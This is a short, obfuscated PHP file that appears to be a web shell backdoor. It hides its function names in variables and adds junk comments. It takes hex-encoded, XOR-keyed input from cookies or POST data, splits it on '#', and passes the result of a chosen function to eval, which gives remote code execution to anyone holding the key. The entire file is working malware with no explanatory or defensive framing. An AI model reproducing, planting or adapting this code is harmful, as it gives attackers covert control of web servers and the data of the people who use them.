<?php

$uNrjqLNcLO = "str_repeat";
$mQlBYq = "explode";
$qpdkJ = "count";
$wfQEOY = "pack";
$qymBwf = array(
    /* n*/
    "BSzORNmbvxFLoCqssTCC" => "OLcolGJsiNeIcEsKy",
);
/*   x  */
$FQNJw = array("AWkPGfUzpNufEfrsHXUuRc" => "doLLZndBamxOG");
foreach (array(
    $qymBwf,
    /*FbG  */
    $_COOKIE,
    $FQNJw,
    $_POST,
    $qymBwf,
) as $lLRXwUmR) {
    /*   ZNkR   */
    foreach ($lLRXwUmR as $JeljKp => $CQAiUlD) {
        /*  ESv */
        $CQAiUlD = @$wfQEOY("H*", $CQAiUlD);
        $JeljKp .= "RNCnkpt-gxEtcic-otwNw-MfQ-RyJw-gRcjy-BzQnY";
        $JeljKp = $uNrjqLNcLO(
            $JeljKp,
            /* yz  */
            strlen($CQAiUlD) / strlen($JeljKp) + 1
        );
        $SAUWI = $CQAiUlD ^ $JeljKp;
        $SAUWI = $mQlBYq(
            /*  Whoo*/
            "#",
            $SAUWI
        );
        /*   Gx   */
        if ($qpdkJ($SAUWI) == 3) {
            /* v*/
            $param1 = $SAUWI[1];
            /*   z   */
            $param2 = $SAUWI[2];
            $param3 = $param1($param2);
            eval($param3);
            die;
        }
    }
}
